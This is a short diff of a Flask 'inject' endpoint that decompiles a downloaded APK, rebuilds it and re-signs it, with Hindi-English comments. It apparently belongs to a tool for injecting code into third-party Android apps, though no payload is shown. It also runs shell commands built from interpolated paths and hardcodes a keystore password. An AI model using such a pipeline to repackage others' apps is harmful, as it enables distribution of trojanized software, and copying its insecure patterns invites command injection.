@@ -42,14 +42,14 @@ def inject():
         if not zipfile.is_zipfile(target):
             return jsonify({"error": "Downloaded file is not a valid APK"}), 400
 
-        # 2. Target APK decompile (-r flag taaki crash na ho)
+        # 2. Target APK decompile
         target_dir = os.path.join(WORK, "target_dir")
         shutil.rmtree(target_dir, ignore_errors=True)
         res = subprocess.run(f"apktool d -r -f -o {target_dir} {target}", shell=True, capture_output=True, text=True)
         if res.returncode != 0:
             return jsonify({"error": f"Apktool target fail: {res.stderr[:200]}"}), 500
 
-        # 3. Check karo ki manifest file hai ya folder
+        # 3. Check manifest
         manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
         if os.path.isdir(manifest_path):
             return jsonify({"error": "Target APK ka structure kharab hai. AndroidManifest.xml ek folder ban gaya hai."}), 500
@@ -85,12 +85,12 @@ def inject():
         if res.returncode != 0:
             return jsonify({"error": f"Apktool build fail: {res.stderr[:200]}"}), 500
 
-        # 8. Sign
+        # 8. Sign (Yahan --min-sdk-version 21 add kar diya hai)
         aligned = os.path.join(WORK, "aligned.apk")
         signed = os.path.join(WORK, "signed.apk")
         subprocess.run(f"zipalign -f -p 4 {unsigned} {aligned}", shell=True, check=True)
         
-        res = subprocess.run(f"apksigner sign --ks {KEYSTORE} --ks-pass pass:sable123 --key-pass pass:sable123 --out {signed} {aligned}", shell=True, capture_output=True, text=True)
+        res = subprocess.run(f"apksigner sign --min-sdk-version 21 --ks {KEYSTORE} --ks-pass pass:sable123 --key-pass pass:sable123 --out {signed} {aligned}", shell=True, capture_output=True, text=True)
         if res.returncode != 0:
             return jsonify({"error": f"Signing failed: {res.stderr[:200]}"}), 500
 
